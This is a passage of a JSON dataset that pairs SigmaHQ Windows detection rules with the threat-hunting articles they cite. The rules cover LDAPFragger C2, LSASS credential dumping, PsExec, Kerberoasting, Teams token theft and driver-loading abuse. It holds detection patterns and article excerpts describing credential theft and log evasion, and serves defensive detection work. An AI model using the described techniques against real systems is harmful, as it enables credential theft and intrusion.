      "id": "d00a9a72-2c09-4459-ad03-5e0a23351e36",
      "status": "test",
      "description": "Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec",
      "date": "2019-03-24",
      "modified": "2022-10-05",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection": {
          "EventID": 5136,
          "AttributeValue|contains": "*",
          "AttributeLDAPDisplayName": [
            "primaryInternationalISDNNumber",
            "otherFacsimileTelephoneNumber",
            "primaryTelexNumber"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Companies, who may use these default LDAP-Attributes for personal information"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_ldap_dataexchange.yml"
  },
  "781": {
    "url": "https://github.com/fox-it/LDAPFragger",
    "markdown": "# LDAPFragger LDAPFragger is a Command and Control tool that enables attackers to route Cobalt Strike beacon data over LDAP using user attributes. For background information, read the release blog: http://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes ## Dependencies and installation - Compiled with `.NET 4.0`, but may work with older and newer .NET frameworks as well ## Usage ``` _ _ __ | | | | / _| | | __| | __ _ _ __ | |_ _ __ __ _ __ _ __ _ ___ _ __ | |/ _` |/ _` | '_ \\| _| '__/ _` |/ _` |/ _` |/",
    "sigma_rule": {
      "title": "Suspicious LDAP-Attributes Used",
      "id": "d00a9a72-2c09-4459-ad03-5e0a23351e36",
      "status": "test",
      "description": "Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies.",
      "references": [
        "https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961",
        "https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/",
        "https://github.com/fox-it/LDAPFragger"
      ],
      "author": "xknow @xknow_infosec",
      "date": "2019-03-24",
      "modified": "2022-10-05",
      "tags": [
        "attack.t1001.003",
        "attack.command-and-control"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection": {
          "EventID": 5136,
          "AttributeValue|contains": "*",
          "AttributeLDAPDisplayName": [
            "primaryInternationalISDNNumber",
            "otherFacsimileTelephoneNumber",
            "primaryTelexNumber"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Companies, who may use these default LDAP-Attributes for personal information"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_ldap_dataexchange.yml"
  },
  "782": {
    "url": "https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious AccessMask Requested From LSASS",
      "id": "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
      "status": "test",
      "description": "Detects process handle on LSASS process with certain access mask",
      "references": [
        "https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html",
        "https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment"
      ],
      "author": "Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)",
      "date": "2019-11-01",
      "modified": "2023-12-19",
      "tags": [
        "attack.credential-access",
        "car.2019-04-004",
        "attack.t1003.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection_1": {
          "EventID": 4656,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessMask|contains": [
            "0x40",
            "0x1400",
            "0x100000",
            "0x1410",
            "0x1010",
            "0x1438",
            "0x143a",
            "0x1418",
            "0x1f0fff",
            "0x1f1fff",
            "0x1f2fff",
            "0x1f3fff"
          ]
        },
        "selection_2": {
          "EventID": 4663,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessList|contains": [
            "4484",
            "4416"
          ]
        },
        "filter_main_specific": {
          "ProcessName|endswith": [
            "\\csrss.exe",
            "\\GamingServices.exe",
            "\\lsm.exe",
            "\\MicrosoftEdgeUpdate.exe",
            "\\minionhost.exe",
            "\\MRT.exe",
            "\\MsMpEng.exe",
            "\\perfmon.exe",
            "\\procexp.exe",
            "\\procexp64.exe",
            "\\svchost.exe",
            "\\taskmgr.exe",
            "\\thor.exe",
            "\\thor64.exe",
            "\\vmtoolsd.exe",
            "\\VsTskMgr.exe",
            "\\wininit.exe",
            "\\wmiprvse.exe",
            "RtkAudUService64"
          ],
          "ProcessName|contains": [
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\Microsoft\\Windows Defender\\Platform\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWow64\\",
            ":\\Windows\\Temp\\asgard2-agent\\"
          ]
        },
        "filter_main_generic": {
          "ProcessName|contains": ":\\Program Files"
        },
        "filter_main_exact": {
          "ProcessName|endswith": [
            ":\\Windows\\System32\\taskhostw.exe",
            ":\\Windows\\System32\\msiexec.exe",
            ":\\Windows\\CCM\\CcmExec.exe"
          ]
        },
        "filter_main_sysmon": {
          "ProcessName|endswith": ":\\Windows\\Sysmon64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_aurora": {
          "ProcessName|contains": ":\\Windows\\Temp\\asgard2-agent-sc\\aurora\\",
          "ProcessName|endswith": "\\aurora-agent-64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_scenarioengine": {
          "ProcessName|endswith": "\\x64\\SCENARIOENGINE.EXE",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira1": {
          "ProcessName|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-"
          ],
          "ProcessName|endswith": "\\avira_system_speedup.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira2": {
          "ProcessName|contains": ":\\Windows\\Temp\\",
          "ProcessName|endswith": "\\avira_speedup_setup_update.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_snmp": {
          "ProcessName|endswith": ":\\Windows\\System32\\snmp.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_googleupdate": {
          "ProcessName|contains": ":\\Windows\\SystemTemp\\",
          "ProcessName|endswith": "\\GoogleUpdate.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_optional_procmon": {
          "ProcessName|endswith": [
            "\\procmon64.exe",
            "\\procmon.exe"
          ],
          "AccessList|contains": "%%4484"
        },
        "condition": "1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_lsass_dump_generic.yml"
  },
  "783": {
    "url": "https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious AccessMask Requested From LSASS",
      "id": "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
      "status": "test",
      "description": "Detects process handle on LSASS process with certain access mask",
      "references": [
        "https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html",
        "https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment"
      ],
      "author": "Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)",
      "date": "2019-11-01",
      "modified": "2023-12-19",
      "tags": [
        "attack.credential-access",
        "car.2019-04-004",
        "attack.t1003.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection_1": {
          "EventID": 4656,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessMask|contains": [
            "0x40",
            "0x1400",
            "0x100000",
            "0x1410",
            "0x1010",
            "0x1438",
            "0x143a",
            "0x1418",
            "0x1f0fff",
            "0x1f1fff",
            "0x1f2fff",
            "0x1f3fff"
          ]
        },
        "selection_2": {
          "EventID": 4663,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessList|contains": [
            "4484",
            "4416"
          ]
        },
        "filter_main_specific": {
          "ProcessName|endswith": [
            "\\csrss.exe",
            "\\GamingServices.exe",
            "\\lsm.exe",
            "\\MicrosoftEdgeUpdate.exe",
            "\\minionhost.exe",
            "\\MRT.exe",
            "\\MsMpEng.exe",
            "\\perfmon.exe",
            "\\procexp.exe",
            "\\procexp64.exe",
            "\\svchost.exe",
            "\\taskmgr.exe",
            "\\thor.exe",
            "\\thor64.exe",
            "\\vmtoolsd.exe",
            "\\VsTskMgr.exe",
            "\\wininit.exe",
            "\\wmiprvse.exe",
            "RtkAudUService64"
          ],
          "ProcessName|contains": [
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\Microsoft\\Windows Defender\\Platform\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWow64\\",
            ":\\Windows\\Temp\\asgard2-agent\\"
          ]
        },
        "filter_main_generic": {
          "ProcessName|contains": ":\\Program Files"
        },
        "filter_main_exact": {
          "ProcessName|endswith": [
            ":\\Windows\\System32\\taskhostw.exe",
            ":\\Windows\\System32\\msiexec.exe",
            ":\\Windows\\CCM\\CcmExec.exe"
          ]
        },
        "filter_main_sysmon": {
          "ProcessName|endswith": ":\\Windows\\Sysmon64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_aurora": {
          "ProcessName|contains": ":\\Windows\\Temp\\asgard2-agent-sc\\aurora\\",
          "ProcessName|endswith": "\\aurora-agent-64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_scenarioengine": {
          "ProcessName|endswith": "\\x64\\SCENARIOENGINE.EXE",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira1": {
          "ProcessName|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-"
          ],
          "ProcessName|endswith": "\\avira_system_speedup.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira2": {
          "ProcessName|contains": ":\\Windows\\Temp\\",
          "ProcessName|endswith": "\\avira_speedup_setup_update.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_snmp": {
          "ProcessName|endswith": ":\\Windows\\System32\\snmp.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_googleupdate": {
          "ProcessName|contains": ":\\Windows\\SystemTemp\\",
          "ProcessName|endswith": "\\GoogleUpdate.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_optional_procmon": {
          "ProcessName|endswith": [
            "\\procmon64.exe",
            "\\procmon.exe"
          ],
          "AccessList|contains": "%%4484"
        },
        "condition": "1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_lsass_dump_generic.yml"
  },
  "784": {
    "url": "https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html",
    "markdown": "# Threat Hunting #3 - Detecting PsExec execution using event 5145 PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems. Existing detection of PSEXEC can be easily bypassed: - **PSEXEC Service created** - logged by EventID 7045 \"Service Creation\" [\"**psexec -r spoolsvr**\" option allows to bypass this one] - **Remote registry change** due",
    "sigma_rule": {
      "title": "Suspicious PsExec Execution",
      "id": "c462f537-a1e3-41a6-b5fc-b2c2cef9bf82",
      "status": "test",
      "description": "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one",
      "references": [
        "https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2022-08-11",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection1": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName|endswith": [
            "-stdin",
            "-stdout",
            "-stderr"
          ]
        },
        "filter": {
          "RelativeTargetName|startswith": "PSEXESVC"
        },
        "condition": "selection1 and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_psexec.yml"
  },
  "785": {
    "url": "https://adsecurity.org/?p=3458",
    "markdown": "# Detecting Kerberoasting Activity **Date**: February 05, 2017 **Categories**: ActiveDirectorySecurity, Hacking, Microsoft Security, Technical Reference **Tags**: AP-REQ, Audit Kerberos Service Ticket Operations, Detect Kerberoast Activity, Detecting Kerberoast Activity, Event ID 4769, Kerberoasting Active Directory, Kerberoasting Activity, Kerberos RC4 Encryption, Kerberos Service Ticket, Kerberos TGS, Kerberos TGS Ticket, KerberosRequestorSecurityToken, NTLM Password, PowerShell Kerberoast, RC4_HMAC_MD5, TGS-REP, TGS-REQ ## Introduction Kerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system. This attack is effective since people tend to create poor passwords. The reason why this attack is",
    "sigma_rule": {
      "title": "Suspicious Kerberos RC4 Ticket Encryption",
      "id": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
      "status": "test",
      "description": "Detects service ticket requests using RC4 encryption type",
      "references": [
        "https://adsecurity.org/?p=3458",
        "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-02-06",
      "modified": "2022-06-19",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "TicketOptions": "0x40810000",
          "TicketEncryptionType": "0x17"
        },
        "reduction": {
          "ServiceName|endswith": "$"
        },
        "condition": "selection and not reduction"
      },
      "falsepositives": [
        "Service accounts used on legacy systems (e.g. NetApp)",
        "Windows Domains with DFL 2003 and legacy systems"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_rc4_kerberos.yml"
  },
  "786": {
    "url": "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity",
    "markdown": "# Trimarc Research: Detecting Kerberoasting Activity Feb 17, 2017 **Updated:** Aug 22, 2017 --- Kerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system. This attack is effective since people tend to create poor passwords. The reason why this attack is successful is that most service account passwords are the same length as the domain password minimum (often 10 or 12 characters long) meaning that even brute force cracking doesn’t likely take longer than the password maximum password age (expiration). Most service accounts don’t",
    "sigma_rule": {
      "title": "Suspicious Kerberos RC4 Ticket Encryption",
      "id": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
      "status": "test",
      "description": "Detects service ticket requests using RC4 encryption type",
      "references": [
        "https://adsecurity.org/?p=3458",
        "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-02-06",
      "modified": "2022-06-19",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "TicketOptions": "0x40810000",
          "TicketEncryptionType": "0x17"
        },
        "reduction": {
          "ServiceName|endswith": "$"
        },
        "condition": "selection and not reduction"
      },
      "falsepositives": [
        "Service accounts used on legacy systems (e.g. NetApp)",
        "Windows Domains with DFL 2003 and legacy systems"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_rc4_kerberos.yml"
  },
  "787": {
    "url": "https://web.archive.org/web/20230329155141/https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html",
    "markdown": "# Threat Hunting #26 - Remote Windows Service Creation / Recon **Date:** Sunday, 3 March 2019 Interacting remotely with windows services is one way to execute programs remotely as well as persisting across system reboots. It can be done via different utilities (sc.exe, WMI etc.) but in this post we will be focusing more on artifacts and methods to detect this based on static behavioral indicators and independently from the used utilities. ## A) Create remotely a service using legit windows built-in utilities: Example of a command to create remotely a new service \"remotesvc\" on host 1.2.3.4 that persist system",
    "sigma_rule": {
      "title": "Remote Service Activity via SVCCTL Named Pipe",
      "id": "586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3",
      "status": "test",
      "description": "Detects remote service activity via remote access to the svcctl named pipe",
      "references": [
        "https://web.archive.org/web/20230329155141/https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2024-08-01",
      "tags": [
        "attack.lateral-movement",
        "attack.persistence",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "svcctl",
          "AccessList|contains": "WriteData"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_svcctl_remote_service.yml"
  },
  "788": {
    "url": "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
    "markdown": "# Microsoft Teams stores auth tokens as cleartext in Windows, Linux, Macs September 14, 2022 Security analysts have found a severe security vulnerability in the desktop app for Microsoft Teams that gives threat actors access to authentication tokens and accounts with multi-factor authentication (MFA) turned on. Microsoft Teams is a communication platform, included in the 365 product family, used by more than 270 million people for exchanging text messages, videoconferencing, and storing files. The newly discovered security issue impacts versions of the application for Windows, Linux, and Mac and refers to Microsoft Teams storing user authentication tokens in clear text",
    "sigma_rule": {
      "title": "Suspicious Teams Application Related ObjectAcess Event",
      "id": "25cde13e-8e20-4c29-b949-4e795b76f16f",
      "status": "test",
      "description": "Detects an access to authentication tokens and accounts of Microsoft Teams desktop application.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectName|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter": {
          "ProcessName|contains": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_teams_suspicious_objectaccess.yml"
  },
  "789": {
    "url": "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens",
    "markdown": "# Undermining Microsoft Teams Security by Mining Tokens **September 13, 2022** ## Overview In August 2022, the Vectra Protect team identified a post-exploitation opportunity allowing malicious actors with sufficient local or remote file system access to steal valid user credentials from Microsoft Teams due to their plaintext storage on disk. This plaintext credential management was determined to impact all commercial and GCC Desktop Teams clients for Windows, Mac, and Linux. While credential harvesting from memory is a common post-exploitation step, we believe that lowering the bar necessary to harvest creds down to just simple read access to the file system",
    "sigma_rule": {
      "title": "Suspicious Teams Application Related ObjectAcess Event",
      "id": "25cde13e-8e20-4c29-b949-4e795b76f16f",
      "status": "test",
      "description": "Detects an access to authentication tokens and accounts of Microsoft Teams desktop application.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/",
        "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens"
      ],
      "author": "@SerkinValery",
      "date": "2022-09-16",
      "tags": [
        "attack.credential-access",
        "attack.t1528"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectName|contains": [
            "\\Microsoft\\Teams\\Cookies",
            "\\Microsoft\\Teams\\Local Storage\\leveldb"
          ]
        },
        "filter": {
          "ProcessName|contains": "\\Microsoft\\Teams\\current\\Teams.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_teams_suspicious_objectaccess.yml"
  },
  "790": {
    "url": "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
    "markdown": "# Hunting in Active Directory: Unconstrained Delegation & Forests Trusts During DerbyCon 2018 this past October, my teammates @tifkin_, @enigma0x3 and @harmj0y gave an awesome presentation titled “The Unintended Risks of Trusting Active Directory”. They demonstrated how an adversary could coerce a domain controller (DC) to authenticate to a server configured with unconstrained delegation, capture the domain controller’s Ticket-Granting-Ticket (TGT), and export the TGT in order to impersonate the DC and perform attacks such as DCSync to request any domain user’s password. For their talk, this use case was presented in the context of one forest with multiple sub-domains; however,",
    "sigma_rule": {
      "title": "User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'",
      "id": "6daac7fc-77d1-449a-a71a-e6b4d59a0e54",
      "status": "test",
      "description": "The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1"
      ],
      "author": "Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community",
      "date": "2019-10-24",
      "modified": "2022-12-25",
      "tags": [
        "attack.lateral-movement",
        "attack.privilege-escalation",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4673,
          "Service": "LsaRegisterLogonProcess()",
          "Keywords": "0x8010000000000000"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_user_couldnt_call_priv_service_lsaregisterlogonprocess.yml"
  },
  "791": {
    "url": "https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/",
    "markdown": "# Universally Evading Sysmon and ETW **07 Apr 2020** The source code and latest release are both available. Sysmon and windows event log are both extremely powerful tools in a defender's arsenal. Their very flexible configurations give them a great insight into the activity on endpoints, making the process of detecting attackers a lot easier. It's for this reason that I'm going to lead you through my journey in defeating them ;) There's been some great research into this by xpn and matterpreter. Their solutions are both good but don't quite reach my needs of a fully universal bypass. Metterpreter's",
    "sigma_rule": {
      "title": "Potential Privileged System Service Operation - SeLoadDriverPrivilege",
      "id": "f63508a0-c809-4435-b3be-ed819394d612",
      "status": "test",
      "description": "Detects the usage of the 'SeLoadDriverPrivilege' privilege. This privilege is required to load or unload a device driver.\nWith this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode.\nThis user right does not apply to Plug and Play device drivers.\nIf you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers.\nThis will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff.\n",
      "references": [
        "https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4673"
      ],
      "author": "xknow (@xknow_infosec), xorxes (@xor_xes)",
      "date": "2019-04-08",
      "modified": "2023-01-20",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection_1": {
          "EventID": 4673,
          "PrivilegeList": "SeLoadDriverPrivilege",
          "Service": "-"
        },
        "filter_exact": {
          "ProcessName": [
            "C:\\Windows\\System32\\Dism.exe",
            "C:\\Windows\\System32\\rundll32.exe",
            "C:\\Windows\\System32\\fltMC.exe",
            "C:\\Windows\\HelpPane.exe",
            "C:\\Windows\\System32\\mmc.exe",
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\wimserv.exe",
            "C:\\Windows\\System32\\RuntimeBroker.exe",
            "C:\\Windows\\System32\\SystemSettingsBroker.exe",
            "C:\\Windows\\explorer.exe"
          ]
        },
        "filter_endswith": {
          "ProcessName|endswith": [
            "\\procexp64.exe",
            "\\procexp.exe",
            "\\procmon64.exe",
            "\\procmon.exe",
            "\\Google\\Chrome\\Application\\chrome.exe",
            "\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
          ]
        },
        "filter_startswith": {
          "ProcessName|startswith": "C:\\Program Files\\WindowsApps\\Microsoft"
        },
        "condition": "selection_1 and not 1 of filter_*"
      },
      "falsepositives": [
        "Other legimate tools loading drivers. Including but not limited to, Sysinternals, CPU-Z, AVs etc. A baseline needs to be created according to the used products and allowed tools. A good thing to do is to try and exclude users who are allowed to load drivers."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_user_driver_loaded.yml"
  },
  "792": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4673",
    "markdown": "# 4673(S, F): A privileged service was called. ```image Alt: Event 4673 illustration Description: The image displays a detailed event properties window for Event ID 4673 from Microsoft Windows Security Auditing. It presents information regarding a privileged service call, including the Subject (with Security ID, Account Name, Account Domain, and Logon ID), Service (with Server and Service Name), Process (with Process ID and Process Name), and Service Request Information (with Privileges). Additionally, it shows log details such as Log Name, Source, Event ID, Task Category, Level, User, Computer, and a link for more information. Transcription: | A privileged service was",
    "sigma_rule": {
      "title": "Potential Privileged System Service Operation - SeLoadDriverPrivilege",
      "id": "f63508a0-c809-4435-b3be-ed819394d612",
      "status": "test",
      "description": "Detects the usage of the 'SeLoadDriverPrivilege' privilege. This privilege is required to load or unload a device driver.\nWith this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode.\nThis user right does not apply to Plug and Play device drivers.\nIf you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers.\nThis will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff.\n",
      "references": [
        "https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4673"
      ],
      "author": "xknow (@xknow_infosec), xorxes (@xor_xes)",
      "date": "2019-04-08",
      "modified": "2023-01-20",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection_1": {
          "EventID": 4673,
          "PrivilegeList": "SeLoadDriverPrivilege",
          "Service": "-"
        },
        "filter_exact": {
          "ProcessName": [
            "C:\\Windows\\System32\\Dism.exe",
            "C:\\Windows\\System32\\rundll32.exe",
            "C:\\Windows\\System32\\fltMC.exe",
            "C:\\Windows\\HelpPane.exe",
